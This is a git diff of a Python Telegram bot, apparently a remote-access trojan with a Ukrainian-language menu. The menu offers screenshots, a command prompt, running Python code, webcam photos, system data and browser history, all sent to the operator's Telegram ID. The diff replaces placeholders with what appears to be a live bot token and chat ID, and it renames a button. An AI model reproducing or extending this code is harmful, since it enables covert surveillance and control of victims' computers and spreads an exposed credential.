@@ -23,8 +23,8 @@ import pyautogui
 #winreg.CloseKey(key)
 
 
-bot = telebot.TeleBot("telegramToken")
-ID: int = #YOR telegram ID
+bot = telebot.TeleBot("5377433922:AAG4QIoFIbtv587e4QJ9a7bo1AKtB4zxK6I")
+ID: int = 886293441 #886293441 886293441 1110656480
 
 bot.send_message(ID, "🟢ОНЛАЙН🟢")
 
@@ -35,7 +35,7 @@ def start(message):
         btn1 = types.KeyboardButton("Отримати скріншот екрану")
         btn2 = types.KeyboardButton("Відкрити командний рядок")
         btn3 = types.KeyboardButton("Команди pyautogui")
-        btn4 = types.KeyboardButton("Запустити пайтон код")
+        btn4 = types.KeyboardButton("Запустити Python код")
         btn5 = types.KeyboardButton("Отримати фото з камери")
         btn6 = types.KeyboardButton("Отримати данні комп'ютера")
         btn7 = types.KeyboardButton("Отримати історію браузера")
@@ -119,7 +119,7 @@ def func(message):
 
 ###########################################################################
 
-        elif message.text == "Запустити код":
+        elif message.text == "Запустити Python код":
             global start_cod
             start_cod = True
             start_markup = types.InlineKeyboardMarkup(row_width=1)
